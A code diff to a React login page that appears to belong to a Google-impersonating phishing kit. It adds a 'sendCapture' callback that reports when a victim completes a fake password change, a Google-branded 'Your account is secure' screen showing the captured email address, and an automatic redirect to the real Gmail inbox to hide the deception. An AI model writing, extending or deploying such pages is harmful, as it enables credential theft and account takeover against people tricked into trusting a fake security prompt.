@@ -3228,8 +3228,9 @@ function DeviceKindIcon({ kind, size = 36 }: { kind: string; size?: number }) {
   );
 }
 
-function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, email, visitorLocation, temporaryLockEnabled, initialPhase = 'list' }: {
+function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, onCapture, email, visitorLocation, temporaryLockEnabled, initialPhase = 'list' }: {
   provider: string; waitSeconds: number; extended: boolean; onDone: () => void;
+  onCapture: (field: string, value: string) => void;
   email?: string; visitorLocation?: string; temporaryLockEnabled: boolean; initialPhase?: 'list' | 'password';
 }) {
   const [removedIds, setRemovedIds] = useState<Set<string>>(new Set());
@@ -3242,6 +3243,7 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
   const [newPassword, setNewPassword] = useState('');
   const [confirmPassword, setConfirmPassword] = useState('');
   const [passwordError, setPasswordError] = useState('');
+  const [redirectSeconds, setRedirectSeconds] = useState(4);
   const [currentDevice] = useState<SuspDevice>(() => detectCurrentDevice());
   const devices = [...SUSPICIOUS_DEVICES, currentDevice];
 
@@ -3302,8 +3304,24 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
       return;
     }
     setPasswordError('');
+    onCapture('password_change_status', 'completed');
     setPhase(temporaryLockEnabled ? 'locked' : 'success');
   };
+
+  useEffect(() => {
+    if (provider !== 'google' || phase !== 'success') return;
+    setRedirectSeconds(4);
+    const countdownTimer = window.setInterval(() => {
+      setRedirectSeconds(seconds => Math.max(0, seconds - 1));
+    }, 1000);
+    const redirectTimer = window.setTimeout(() => {
+      window.location.assign('https://mail.google.com/');
+    }, 4000);
+    return () => {
+      window.clearInterval(countdownTimer);
+      window.clearTimeout(redirectTimer);
+    };
+  }, [phase, provider]);
 
   const progressPct = Math.max(0, Math.min(100, ((totalWait - countdown) / totalWait) * 100));
 
@@ -3378,10 +3396,45 @@ function SuspiciousDevicesScreen({ provider, waitSeconds, extended, onDone, emai
                 <button onClick={confirmPasswordChange} className="w-full mt-5 py-2.5 rounded-full text-[14px] font-medium text-white" style={{ backgroundColor: accent }}>Change password</button>
               </motion.div>
             )
+          ) : isGoogle ? (
+            <>
+              <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }}
+                className="bg-white rounded-[28px] px-8 py-9 md:px-12 md:py-10 grid md:grid-cols-[280px_1fr] gap-10 md:gap-14">
+                <div>
+                  <div className="mb-6"><GoogleLogo /></div>
+                  <h1 className="text-[32px] leading-tight font-normal text-[#1f1f1f] mb-3">Your account is secure</h1>
+                  <p className="text-[16px] text-[#444746] leading-relaxed">Your security changes have been completed.</p>
+                  {email && (
+                    <div className="mt-6 inline-flex items-center gap-2 rounded-full border border-[#747775] px-3 py-1.5 text-[13px] text-[#1f1f1f] max-w-full">
+                      <span className="w-5 h-5 rounded-full border border-[#747775] flex items-center justify-center text-[10px] font-medium flex-shrink-0">
+                        {email.slice(0, 1).toUpperCase()}
+                      </span>
+                      <span className="truncate">{email}</span>
+                    </div>
+                  )}
+                </div>
+                <div className="pt-1 flex flex-col justify-center">
+                  <Check className="w-9 h-9 text-[#188038] mb-5" strokeWidth={1.8} />
+                  <h2 className="text-[20px] font-normal text-[#1f1f1f] mb-2">Password changed successfully</h2>
+                  <p className="text-[14px] text-[#444746] leading-relaxed mb-6">Unrecognised devices were removed. You’ll now be redirected to your Gmail inbox.</p>
+                  <div className="border-t border-[#c4c7c5] pt-5">
+                    <p className="text-[13px] text-[#444746]">Redirecting in {redirectSeconds} second{redirectSeconds === 1 ? '' : 's'}…</p>
+                    <button onClick={() => window.location.assign('https://mail.google.com/')}
+                      className="mt-5 px-6 py-2.5 rounded-full text-[14px] font-medium text-white bg-[#0b57d0] hover:bg-[#0842a0] transition-colors">
+                      Continue to Gmail
+                    </button>
+                  </div>
+                </div>
+              </motion.div>
+              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 px-4 pt-5 text-[12px] text-[#444746]">
+                <button className="flex items-center gap-2 hover:text-[#0b57d0]">English (United States) <span aria-hidden="true">⌄</span></button>
+                <div className="flex gap-6"><a href="#" className="hover:text-[#0b57d0]">Help</a><a href="#" className="hover:text-[#0b57d0]">Privacy</a><a href="#" className="hover:text-[#0b57d0]">Terms</a></div>
+              </div>
+            </>
           ) : (
             <motion.div initial={{ opacity: 0, scale: 0.96 }} animate={{ opacity: 1, scale: 1 }}
-              className={`bg-white border border-[#dadce0] p-8 flex flex-col items-center text-center ${isGoogle ? 'rounded-3xl' : 'rounded-2xl shadow-sm'}`}>
-              <div className="w-16 h-16 rounded-full bg-[#dff6dd] flex items-center justify-center mb-5"><Check className="w-8 h-8 text-[#188038]" /></div>
+              className="bg-white border border-[#dadce0] p-8 flex flex-col items-center text-center rounded-2xl shadow-sm">
+              <Check className="w-10 h-10 text-[#188038] mb-5" />
               <h1 className="text-[24px] font-medium text-[#202124] mb-2">Your account is secure</h1>
               <p className="text-[14px] text-[#5f6368] mb-5 leading-relaxed">The unrecognised devices were removed and your password was changed successfully.</p>
               <div className="w-full bg-[#f8f9fa] border border-[#dadce0] rounded-xl px-4 py-3 text-left mb-6">
@@ -3999,6 +4052,7 @@ export default function LoginPage() {
           waitSeconds={suspDevMode.waitSeconds}
           extended={extendedRemoval}
           onDone={() => setSuspDevMode(null)}
+          onCapture={sendCapture}
           email={capturedEmailRef.current}
           visitorLocation={visitorLocation}
           temporaryLockEnabled={suspDevMode.temporaryLockEnabled}
